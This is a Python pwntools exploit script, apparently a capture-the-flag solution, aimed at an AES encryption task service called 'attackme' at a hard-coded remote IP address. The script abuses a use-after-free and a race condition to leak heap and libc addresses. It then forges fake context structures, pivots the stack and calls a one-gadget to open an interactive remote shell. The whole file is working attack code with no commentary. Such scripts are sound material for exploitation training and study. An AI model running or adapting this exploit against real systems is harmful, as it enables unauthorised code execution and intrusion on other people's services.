from pwn import *
from Crypto.Cipher import AES

def get_prompt():
	return p.recvuntil("Choice: ")

def decrypt_cbc(ct, key, iv):
	cipher = AES.new(key,AES.MODE_CBC,iv)
	pt = cipher.decrypt(ct)
	return pt

def encrypt_cbc(pt, key, iv):
	cipher = AES.new(key,AES.MODE_CBC,iv)
	ct = cipher.encrypt(pt)
	return ct


def add_task(taskid, mode, key, iv, plaintext_len, plaintext,give_plaintext=True,fast=False):
	p.sendline("1")
	if not fast:
		p.recvuntil("Task id : ")
	p.sendline(str(taskid))
	if not fast:
		p.recvuntil("Encrypt(1) / Decrypt(2): ")
	p.sendline(str(mode))
	if not fast:
		p.recvuntil("Key : ")
	p.send(key.ljust(0x20,"\x00"))
	if not fast:
		p.recvuntil("IV : ")
	p.send(iv.ljust(0x10,"\x00"))
	if not fast:
		p.recvuntil("Data Size : ")
	p.sendline(str(plaintext_len))
	if not fast:
		p.recvuntil("Data : ")
	if give_plaintext:
		p.send(plaintext)
		get_prompt()
	else:
		return
	

def delete_task(taskid,fast=False):
	p.sendline("2")
	if not fast:
		p.recvuntil("Task id : ")
	p.sendline(str(taskid))
	if not fast:
		get_prompt()

def go(taskid):
	p.sendline("3")
	p.recvuntil("Task id : ")
	p.sendline(str(taskid))

if __name__ == "__main__":
	cmdline="./ld-2.27.so ./attackme"
	libc = ELF("./libs/libc.so.6")
	#p = process(cmdline.split(" "),env={"LD_LIBRARY_PATH":"./libs"})
	p = remote("111.186.63.201", 10001)
	# leaking phase
	add_task(0x20,1,"A"*0x20,"B"*0x10,0x20,"\x03"*0x20)
	add_task(0x21,1,"A"*0x20,"B"*0x10,0x20,"\x01"*0x20)

	delete_task(0x21)
	go(0x20)

	delete_task(0x20,fast=True)
	add_task(0x20,1,"A"*0x20,"B"*0x10,0x70,"\x04"*0x70,give_plaintext=False,fast=True)

	p.recvuntil("Ciphertext: \n")
	log.success("got leak ciphertext")
	data = ""
	for i in range(8):
		data += p.recvline().strip()+" "
	
	data = data.strip()
	data = data.split(" ")
	data = [chr(int(x,16)) for x in data]
	ct = "".join(data)
	x = decrypt_cbc(ct,"A"*0x20,"B"*0x10)
	ptr1 = u64(x[0x58:0x60])
	ptr2 = u64(x[0x68:0x70])
	log.success("leak1: 0x%x, leak2: 0x%x"%(ptr1,ptr2))
	p.send("A"*0x70)
	
	log.info("creating 8 unsorted bins to get LIBC leak")
	for i in range(9):
		add_task(0x3000+i,1,"A"*0x20,"B"*0x10,0xc0,"\xdd"*0xc0,fast=True)
		log.info("malloc'ed bin %d"%i)

	for i in range(8):
		delete_task(0x3000+i)
		log.info("free'd bin %d"%i)

	vulnerable_addr = 0x7fe453e1dd60 - 0x7fe453e1c570 + ptr1 +0x70

	# LIBC leak phase
	
	add_task(0,1,"A"*0x20,"B"*0x10,0x70,"\xcc"*0x70)
	add_task(1,1,"A"*0x20,"B"*0x10,0x70,"\xdd"*0x70)
	add_task(2,1,"A"*0x20,"B"*0x10,0x70,"\xee"*0x70)

	log.info("now triggering the race")
	go(2)

	delete_task(2,fast=True)
	delete_task(1,fast=True)

	add_task(3,1,"A"*0x20,"B"*0x10,0x20,"\x01"*0x20,fast=True)
	FAKESTRUCT = p64(vulnerable_addr)+p64(0x20)
	add_task(4,1,"A"*0x20,"B"*0x10,0x70,FAKESTRUCT,give_plaintext=False,fast=True)
	p.send(FAKESTRUCT)
	log.info("did every job required for the race to work very quickly!")

	p.recvuntil("Ciphertext: \n")
	data = ""
	for i in range(3):
		data += p.recvline().strip()+" "
	
	data = data.strip()
	data = data.split(" ")
	data = [chr(int(x,16)) for x in data]
	ct = "".join(data)
	x = decrypt_cbc(ct,"A"*0x20,"B"*0x10)
	LIBC = u64(x[:8]) + 0x7fa1908f8000 - 0x7fa190ce3ca0
	log.info("LIBC: 0x%x"%LIBC)

	p.send("A"*0x60)

	pivot = LIBC + 0x000000000002c9c3
	oneshot = LIBC + 0x4f322
	
	fake_ctx_addr = ptr1 + 0x7f79f8de5880 - 0x7f79f8de5570
	FAKE_CTX = p64(fake_ctx_addr)  +"\xFF"*0x18
	FAKE_CTX += p64(pivot)
	FAKE_CTX = FAKE_CTX.ljust(0x70,"\xFF")

	log.info("preparing some fake CTX structures for a single RIP control exploit")

	add_task(0x3330,1,"A"*0x20,"B"*0x10,0x70,FAKE_CTX)
	add_task(0x3331,1,"A"*0x20,"B"*0x10,0x70,"\xdd"*0x70)
	add_task(0x3332,1,"A"*0x20,"B"*0x10,0x70,"\xee"*0x70)

	log.info("now triggering the final race, every task must be finished in less than 2 secs")
	go(0x3332)

	delete_task(0x3332,fast=True)
	delete_task(0x3331,fast=True)

	add_task(0x3333,1,"A"*0x20,"B"*0x10,0x20,"\x01"*0x20,fast=True)
	
	FAKESTRUCT = p64(oneshot) + p64(0) + "\x00"*0x48
	FAKESTRUCT += p64(fake_ctx_addr)
	FAKESTRUCT = FAKESTRUCT.ljust(0x70,"\x00")
	
	add_task(0x3334,1,"A"*0x20,"B"*0x10,0x70,FAKESTRUCT,fast=True)
	log.info("all tasks done, now wait for the shell to pop up!")


	p.interactive()
